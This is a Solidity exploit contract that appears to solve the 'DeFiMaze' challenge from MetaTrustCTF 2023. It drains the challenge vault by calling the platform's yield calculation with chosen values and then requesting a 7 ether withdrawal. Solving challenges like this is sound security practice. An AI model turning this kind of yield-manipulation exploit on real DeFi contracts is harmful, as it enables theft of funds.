// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "src/MetaTrustCTF_2023/DeFiMaze/SetUp.sol";

contract DeFiMazeAttack {
    SetUp public setup;
    DeFiPlatform public platform;
    Vault public vault;

    function attack(address target) public {
        setup = SetUp(target);
        platform = setup.platfrom();
        vault = setup.vault();

        platform.calculateYield(1 ether, 100 ether, 0);
        platform.requestWithdrawal(7 ether);
        vault.isSolved();
    }
}
